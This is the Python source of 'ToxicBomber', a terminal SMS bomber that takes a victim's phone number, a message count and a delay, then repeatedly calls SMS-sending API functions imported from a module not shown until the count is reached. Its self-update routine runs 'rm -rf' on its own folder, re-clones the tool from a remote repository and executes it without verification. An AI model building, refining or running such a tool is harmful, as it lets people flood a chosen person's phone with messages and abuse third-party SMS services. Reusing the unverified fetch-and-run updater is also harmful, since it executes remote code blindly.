#########################################
# ToxicBomber
# A Bangladeshi SMS Bomber Tool
# Author: ToxicNoob Inc.
# GitHub: https://github.com/Toxic-Noob
# Version: 4.1.0
#########################################

import time
import requests
import sys
import os
import shutil
import json

#Get Rows and Columns of Screen
columns = shutil.get_terminal_size().columns

def psb(z, end="\n"):
    for e in z + end:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

# Check Python Version, as Python < 3.11 Does not support 3.11 encryption
def checkPy():
    major = sys.version_info.major
    minor = sys.version_info.minor
    if (major != 3) or (minor < 11):
        print(f"\n[\033[92m*\033[37m] Your Python Version ({major}.{minor}) is not Supported!")
        print("[\033[92m*\033[37m] Update Your Python Using the Command Below:\n\n    pkg reinstall python\n")
        sys.exit()


# Show New Message from Author
def showAuthorMsg(msg):
    print()
    print("\033[94m-"*columns, end="")
    print("\033[92mMessage From Author".center(columns+4))
    print("\033[95m-"*columns, end="")
    psb("\n\033[37m    " + msg + "\n")
    print("\033[94m-"*columns, end="", flush=1)
    print()
    open("./more/.msg", "w").write(msg)
    time.sleep(1)
    input("\n    \033[92m[\033[37m*\033[92m] \033[37mPress Enter To Continue...")
    logo()


#Check Update
def update():
    try:
        toolVersion = json.loads(open("./more/.version", "r").read())["version"]
    except:
        toolVersion = "ToxicNoob"
    
    try:
        authorMsg = open("./more/.msg", "r").read().replace("\n", "")
    except:
        authorMsg = "None"
    
    try:
        parsedData = requests.get("https://raw.githubusercontent.com/Toxic-Noob/ToxicBomber/main/more/.version").json()
    except:
        psb("\n    \033[92m[\033[91m!\033[92m] \033[37mPlease Connect To The Internet!")
        time.sleep(1)
        l = input("\n    \033[92m[\033[37m*\033[92m] \033[37mPress Enter To Continue...")
        update()
    
    mainVersion = parsedData["version"]
    newMsg = parsedData["message"]
    
    # If Tool Version Is not Same, Update Tool
    if (toolVersion != mainVersion):
        psb("\n    \033[92m[\033[37m!\033[92m] \033[37mTool Update Found!")
        time.sleep(0.5)
        psb("    \033[92m[\033[37m!\033[92m] \033[37mUpdating Tool: ", end="")
        
        os.system("cd .. && rm -rf ToxicBomber && git clone https://github.com/Toxic-Noob/ToxicBomber > /dev/null 2>&1")
        
        print("\033[37mDone")
        psb("\n    \033[92m[\033[37m*\033[92m] \033[37mStarting Tool...")
        time.sleep(0.8)
        
        os.system("cd .. && cd ToxicBomber && python Tbomb.py")
    
    else:
        if (authorMsg != newMsg) and (newMsg != "blank"):
            showAuthorMsg(newMsg)


#Logo
def logo():
    os.system("clear")
    print("\033[94m┌────────────────────────────────────────┐".center(columns+5))
    print("\033[94m│     \033[92m▀▛▘     ▗    ▛▀▖       ▌        \033[94m   │".center(columns+15))
    print("\033[94m│     \033[92m ▌▞▀▖▚▗▘▄ ▞▀▖▙▄▘▞▀▖▛▚▀▖▛▀▖▞▀▖▙▀▖\033[94m   │".center(columns+15))
    print("\033[94m│     \033[92m ▌▌ ▌▗▚ ▐ ▌ ▖▌ ▌▌ ▌▌▐ ▌▌ ▌▛▀ ▌  \033[94m   │".center(columns+15))
    print("\033[94m│     \033[92m ▘▝▀ ▘ ▘▀▘▝▀ ▀▀ ▝▀ ▘▝ ▘▀▀ ▝▀▘▘  \033[94m   │".center(columns+15))
    print("\033[94m│                              \033[94m          │".center(columns+9))
    print("\033[94m│ \033[95mAuthor : ToxicNoob Inc.                \033[94m│".center(columns+15))
    print("│ \033[95mTool   : Unlimited SMS Bomber          \033[94m│".center(columns+9))
    print("│ \033[95mGitHub : https://github.com/Toxic-Noob \033[94m│".center(columns+9))
    print("│ \033[95mCoder  : HunterSl4d3              \033[37mV4.1 \033[94m│".center(columns+15))
    print("\033[94m└────────────────────────────────────────┘".center(columns+5))


# Options Banner
def banner():
    amount = str(main.amount)
    # 21 - 1(lenOfAmount) = 20....
    amount = amount + (" " * (21-len(amount)))
    
    print("\033[95m-" * (columns), end = "")
    print(("\033[92mTarget  : \033[37m0" + main.number + "          ").center(columns + 10))
    print(("\033[92mAmount  : \033[37m" + amount).center(columns + 10))
    print("\033[92mProcess : \033[37mStarted               ".center(columns + 10))
    print("\033[92mNote    : \033[37mPress ctrl + z To Stop".center(columns + 10))
    print("\033[95m-" * (columns), end = "")
    print("\n")


#Check SMS Sent and Process
def check(sent):
    amount = main.amount
    delay = main.delay
    
    localTime = time.localtime()
    current_time = time.strftime("%I:%M:%S", localTime)

    print(f"\r\033[92m    [\033[94m {current_time} \033[92m] Message Sent : \033[94m[\033[37m{sent}\033[94m]\033[37m", end="")
    
    if (sent == amount):
        psb("\n\n\033[92m    [\033[37m*\033[92m] Bombing Finished!")
        psb("\033[92m    [\033[37m*\033[92m] Amount : \033[37m" + str(amount))
        psb("\033[92m    [\033[37m*\033[92m] Target : \033[37m0" + main.number)
        psb("\033[92m    [\033[37m*\033[92m] From   : \033[37mToxicBomber\n")
        time.sleep(0.6)
        print("\033[92m[\033[93m★\033[92m] Thanks For Using Our Tool \033[92m[\033[93m★\033[92m]".center(columns + 30))
        print("\033[37m")
        
        return True
    else:
        time.sleep(delay)
        return False


#Get Target Number
def getNumber():
    number = input("\n    \033[92m[\033[37m*\033[92m] \033[37mEnter Target (\033[92mWithout +88\033[37m):> \033[37m")
    if not number.isdigit():
        psb("\n    \033[92m[\033[91m!\033[92m] \033[37mPlease Enter a Correct Number!")
        number = getNumber()
    if not (len(number) == 11):
        psb("\n    \033[92m[\033[91m!\033[92m] \033[37mPlease Enter 11 Digit Number!")
        number = getNumber()
    
    return number


#Main    
def main():
    number = getNumber()
    number = number[-10:]
    main.number = number
    
    amount = input("    \033[92m[\033[37m*\033[92m] \033[37mEnter Amount (\033[92mDefault: 10\033[37m):> \033[37m")
    try:
        amount = int(amount)
    except:
        amount = 10
    
    main.amount = amount
    
    delay = input("    \033[92m[\033[37m*\033[92m] \033[37mEnter Time(\033[92mSec\033[37m) Delay (\033[92mDefault: 2s\033[37m):> \033[37m")
    try:
        delay = int(delay)
    except:
        delay = 2
    
    main.delay = delay
    
    time.sleep(1)
    logo()
    banner()
    sent = 0
    
    items = RUNNABLE_ITEMS
    finished = False
    
    # Running through all apis using Global Variables
    allFuncs = globals()
    if check(sent):
        sys.exit()
    
    while True:
        for i in range(1, items+1):
            success = allFuncs["api_"+str(i)](number)
            if (success):
                sent += 1
                if(check(sent)):
                    finished = True
                    break
            
        if (finished):
            break


# Start Ruuning Tool
if (__name__ == "__main__"):
    checkPy()
    from more.data import *
    logo()
    update()
    main()
